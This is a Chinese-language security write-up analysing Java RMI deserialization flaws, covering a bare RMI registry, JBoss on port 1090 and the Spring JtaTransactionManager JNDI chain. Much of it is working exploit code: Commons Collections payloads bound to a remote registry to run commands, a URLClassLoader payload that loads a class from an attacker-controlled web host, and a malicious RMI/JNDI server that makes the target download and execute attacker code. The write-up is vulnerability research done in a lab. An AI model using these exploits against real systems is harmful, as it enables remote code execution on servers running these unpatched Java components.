# java RMI相关反序列化漏洞整合分析

**Author：angelwhu**

0x00 背景
=======

* * *

在阐述java反序列化漏洞时，[原文](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)中提到：

> Java LOVES sending serialized objects all over the place. For example:
> 
> In HTTP requests – Parameters, ViewState, Cookies, you name it.
> 
> RMI – The extensively used Java RMI protocol is 100% based on serialization  
> RMI over HTTP – Many Java thick client web apps use this – again 100% serialized objects
> 
> JMX – Again, relies on serialized objects being shot over the wire Custom Protocols – Sending an receiving raw Java objects is the norm – which we’ll see in some of the exploits to come

在java使用RMI机制时，会使用序列化对象进行数据传输。这就会产生java反序列化漏洞。利用范围是很大。

之后，绿盟科技提到了[JBoss中存在RMI机制方面的漏洞](http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/)。最近又有了[spring框架RCE漏洞](http://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/)，这个漏洞利用与RMI密切相关。

这里便整理关于RMI漏洞的相关漏洞，并进行简要利用分析。

0x01 RMI简介
==========

* * *

摘自网络的简要介绍：

> RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。

这里看出它的功能中是可以通过网络进行对象的传输，使其可以进行远程对象调用。下面就写一个简单的RMI程序，说明其存在反序列化漏洞问题。

0x02 RMI应用程序攻击
==============

* * *

首先简单的实现一个服务端，启用RMI服务，绑定在6600端口：

```
public class Run {

    public static void main(String[] args) {
        try {
            //PersonServiceInterface personService=new PersonServiceImp();
            //注册通讯端口
            LocateRegistry.createRegistry(6600);
            //注册通讯路径
            //Naming.rebind("rmi://127.0.0.1:6600/PersonService", personService);
            System.out.println("Service Start!");
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

}

```

上述代码中代码中，本来我使用`bind`函数，将`personService`对象绑定在服务器端供外部调用。

但我发现，即使没有任何对象绑定，只是用一行代码`LocateRegistry.createRegistry(6600);`,开通RMI服务。然后，通过访问服务端口（这里的6600端口），即可实现反序列化攻击。

这里进行利用当然遵从java反序列化漏洞中一个条件：`Apache Commons Collections`或者其他存在缺陷的第三方库包含在lib路径中。这里使用的是`commons-collections-3.1.jar`,将其加入到lib路径中。

![](http://drops.javaweb.org/uploads/images/add44f918973c8c7b117c134e86abfd3b0c23777.jpg)

这样，上述简单的RMI应用程序满足了反序列化漏洞的两个条件：

*   存在反序列化对象数据传输。
*   有缺陷的`Apache Commons Collections`第三方库在lib路径中。

攻击代码的编写：

```
Object instance = PayloadGeneration.generateExecPayload("calc");

InvocationHandler h = (InvocationHandler) instance;
Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[]{Remote.class},h));//动态代理Rmote接口。
Registry registry = LocateRegistry.getRegistry(ip, port);//服务器端的ip和端口
try{
    registry.bind("pwned", r); // r is remote obj
}
catch (Throwable e) 
{
    e.printStackTrace();
}

```

这里将java反序列化漏洞的payload封装了下，`PayloadGeneration.generateExecPayload("calc");`会产生一个执行`calc`命令的对象，有兴趣的可以在我的[github](https://github.com/angelwhu/java_unserialize/blob/master/payload/PayloadGeneration.java)上查看源码。然后，将我们的payload发送到RMI服务端口进行攻击。

`registry.bind("pwned", r);`中r对象必须继承`Remote`接口。所以这里使用了java动态代理技术来代理Remote接口并生成其对象`r`。然后使用`bind`函数便可将攻击payload发送到RMI服务中，远程执行`calc`命令，攻击完成。本机测试如下：

![](http://drops.javaweb.org/uploads/images/143e29e09ea8c573c847b6c66ba6f4a509f9d2c2.jpg)

这里可以看到，只要应用服务器上使用了RMI服务，并使用了`Apache Commons Collections`第三方库，就可能存在反序列化命令执行的漏洞。

值得关注的是，RMI服务的攻击，同样可以使用`URLClassLoader`方法进行回显。

```
Object instance = PayloadGeneration.generateURLClassLoaderPayload("http://****/java/", "exploit.ErrorBaseExec", "do_exec", "pwd"); 

```

同样，将封装好的payload换成`URLClassLoader`的攻击负载。便能加载远程的`exploit.ErrorBaseError`类，执行`pwd`命令，即可回显。这是我在Ubuntu上运行服务端进行的测试结果。

![](http://drops.javaweb.org/uploads/images/92f5f941d914856ce5f2397d22b2f413de9ef10c.jpg)

这里说明了应用程序在使用RMI机制时，会存在反序列化的问题。如果恰好使用了有缺陷的第三方库，那就可以远程命令执行了。接下来，看看实际场景中的相关漏洞。

0x03 JBoss RMI攻击利用
==================

* * *

JBOSS符合我们在上述讨论中的两个条件：

*   它使用了RMI机制进行信息通信，端口1099使用了`jndi`和端口1090则是RMI服务端口。
*   并且包含了`Apache Commons Collections`第三方库。于是就可以说存在远程命令执行漏洞了。

在绿盟科技的文章中，提到了JBOSS中存在使用RMI机制的问题，可以在JMXInvoker删除的情况下获取shell。 于是可以这样重现命令执行。

使用如下命令启动jboss，默认就会对外开放所有端口。当然10.10.10.135代表本机ip。

```
./run.sh -b 10.10.10.135  

```

首先，扫描一下jboss服务器端口，这里我使用的是`jboss-6.1.0.Final`版本，安装在Ubuntu虚拟机中。使用nmap扫描结果如下：

```
1090/tcp open  ff-fms
1091/tcp open  ff-sm
1098/tcp open  rmiactivation
1099/tcp open  rmiregistry
4446/tcp open  n1-fwp
5500/tcp open  hotline
8009/tcp open  ajp13
8080/tcp open  http-proxy
8083/tcp open  us-srv  

```

发现1090端口和1099端口对外开放了。也就是说RMI服务对外开放了。

在这里说一下，在jboss利用上面，按照原文的代码利用，没有重现成功。其中有payload的问题，所以使用了我自己写的封装好的payload，比较方便。另外，我们一开始认为攻击1099端口，我的好同学研究发现应该是1090端口，这才攻击成功。

于是有了以下攻击代码：

```
Object instance = PayloadGeneration.generateURLClassLoaderPayload("http://******:8080/java/", "exploit.ErrorBaseExec", "do_exec", "pwd"); 

InvocationHandler h = (InvocationHandler) instance;
Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[]{Remote.class},h));
Registry registry = LocateRegistry.getRegistry("10.10.10.135", 1090);
try{
    registry.bind("pwned", r); // r is remote obj
}
catch (Throwable e) 
{
    e.printStackTrace();
}   

```

运行代码，并攻击Jboss可以得到如下执行结果：

![](http://drops.javaweb.org/uploads/images/feafe8db4eac9fd5353210db912bcb78190bb10b.jpg)

0x04 Spring framework远程命令执行分析
=============================

* * *

这个漏洞涉及JNDI和RMI服务，比较有趣。代码细节分析请参考资料中的第三个，分析的非常好，就不班门弄斧了。这里简单理清这个攻击的步骤。

与`Apache Commons Collections`这个库的反序列化利用类似，我们需要将spring框架中的lib包，包含在`CLASSPATH`中。这个要求比较苛刻，需要的包也比较多：

![](http://drops.javaweb.org/uploads/images/7e63c942ebce6a232a872af15d18fc34577292f2.jpg)

翻译下[原文](http://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce)的命令执行代码链：

`spring-tx.jar`中包含`org.springframework.transaction.jta.JtaTransactionManager`类，这个类存在JNDI的反序列化问题。  
它的readObject() 方法执行中含有这样的一个路径：

```
initUserTransactionAndTransactionManager()->
lookupUserTransaction()->
JndiTemplate.lookup()->
InitialContext.lookup(userTransactionName)  

```

`InitialContext.Lookup()`会调用`userTransactionName`属性，这个属性是我们可以控制的。  
查阅JNDI使用，可以发现`userTransactionName`属性可以是一个外网的RMI路径，比如:`rmi://10.10.10.1:1099/Object`。

于是我们可以**自己搭建一个RMI服务器**，让目标服务器来访问下载执行准备好的任意java代码。  
服务端搭建在Ubuntu虚拟机上，简单地建立一个socket进行数据传输并反序列化解析。代码自行查阅github~~

简要画的原理如下：

![](http://drops.javaweb.org/uploads/images/2a88587b863827830a48d109d2a2421a1526cc92.jpg)

Client端即为攻击方，它向目标服务器发送`JtaTransactionManager`序列化对象后，会触发server端进行访问Client端(即：这时的RMI服务器端)中的RMI服务，去下载任意java对象进行执行。关键代码为：

```
//创建RMI服务
Registry registry = LocateRegistry.createRegistry(1099);
Reference reference = new javax.naming.Reference("client.ExportObject","client.ExportObject","http://"+ localAddress +"/");
//访问rmi服务时，会转到该url地址中下载client.ExportObject类，并新建对象。

ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
registry.bind("Object", referenceWrapper);

String jndiAddress = "rmi://"+localAddress+":1099/Object";
//通过jndi访问rmi服务

org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
object.setUserTransactionName(jndiAddress);

```

测试远程执行`ifconfig`命令，可在服务端看到执行成功，同时客户端看到了访问记录。结果如下：

![](http://drops.javaweb.org/uploads/images/e2ccb73099e01591b561d4f4ed6402ee087135c1.jpg)

![](http://drops.javaweb.org/uploads/images/a52cd1ff7982b44db9283f993e6fd18c639b6a28.jpg)

0x05 结语
=======

* * *

java反序列漏洞影响很大，RMI机制也是冰山一角。期待相互交流研究。

0x06 参考资料及源码
============

* * *

*   [http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
*   [http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/](http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/)
*   [http://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/](http://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/)
*   [http://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce](http://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce)
*   [https://github.com/angelwhu/java_unserialize](https://github.com/angelwhu/java_unserialize)
*   [https://github.com/zerothoughts/spring-jndi](https://github.com/zerothoughts/spring-jndi)